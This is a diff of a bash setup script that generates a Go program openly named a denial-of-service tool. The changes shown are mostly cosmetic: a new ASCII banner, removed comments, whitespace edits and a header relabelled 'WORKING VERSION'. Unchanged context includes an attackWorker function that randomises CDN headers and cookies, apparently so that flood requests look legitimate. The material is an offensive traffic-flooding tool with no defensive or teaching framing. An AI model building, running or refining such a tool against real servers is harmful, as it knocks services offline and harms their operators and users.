@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # ----------------------------------------
-# GO DOS TOOL SETUP (HTTP/2 + HTTP/1.1 ONLY)
+# GO DOS TOOL SETUP (WORKING VERSION)
 # ----------------------------------------
 
 # Color definitions
@@ -12,9 +12,8 @@ BLUE='\033[0;34m'
 PURPLE='\033[0;35m'
 CYAN='\033[0;36m'
 WHITE='\033[1;37m'
-NC='\033[0m' # No Color
+NC='\033[0m'
 
-# Separator line
 SEP="━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
 
 clear
@@ -23,7 +22,6 @@ echo -e "${WHITE}  DENIAL SERVICE OF GO${NC}"
 echo -e "${CYAN}${SEP}${NC}"
 echo
 
-# Create main.go file directly (CLEAN version - no unused imports)
 echo -e " ${YELLOW}➤${NC} ${GREEN}Creating main.go...${NC}"
 
 cat > main.go << 'EOF'
@@ -923,6 +921,7 @@ var (
   'yo-NG,yo;q=0.8',
   'zgh-MA,zgh;q=0.8',
   'zu-ZA,zu;q=0.8',
+
 	}
 
 	acceptHeaders = []string{
@@ -1275,14 +1274,14 @@ func getNextColor() string {
 func printBanner() {
 	color := getNextColor()
 	fmt.Print(color)
-	fmt.Println(" ::::'######::::'#######::::: ")
-	fmt.Println(" :::'##... ##::'##.... ##:::: ")
-	fmt.Println(" ::: ##:::..::: ##:::: ##:::: ")
-	fmt.Println(" ::: ##::'####: ##:::: ##:::: ")
-	fmt.Println(" ::: ##::: ##:: ##:::: ##:::: ")
-	fmt.Println(" ::: ##::: ##:: ##:::: ##:::: ")
-	fmt.Println(" :::. ######:::. #######::::: ")
-	fmt.Println(" ::::......:::::.......:::::: ")
+	fmt.Println("")
+	fmt.Println("███████╗██╗░░░██╗██████╗░███████╗██████╗░")
+	fmt.Println("██╔════╝╚██╗░██╔╝██╔══██╗██╔════╝██╔══██╗")
+	fmt.Println("█████╗░░░╚████╔╝░██████╔╝█████╗░░██║░░██║")
+	fmt.Println("██╔══╝░░░░╚██╔╝░░██╔═══╝░██╔══╝░░██║░░██║")
+	fmt.Println("███████╗░░░██║░░░██║░░░░░███████╗██████╔╝")
+	fmt.Println("╚══════╝░░░╚═╝░░░╚═╝░░░░░╚══════╝╚═════╝░")
+	fmt.Println("")
 	fmt.Println("\033[0m")
 }
 
@@ -1625,14 +1624,13 @@ func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter,
 				}
 			}
 
-
-			// CDN Headers
+						// CDN Headers
 			if randInt(1, 100) <= 40 {
 				cdnHeader := cdnHeaders[randInt(0, len(cdnHeaders)-1)]
 				for k, v := range cdnHeader {
 					req.Header.Set(k, v)
 				}
-			}			
+			}		
 
 			// Cookies
 			if randInt(1, 100) <= 60 {
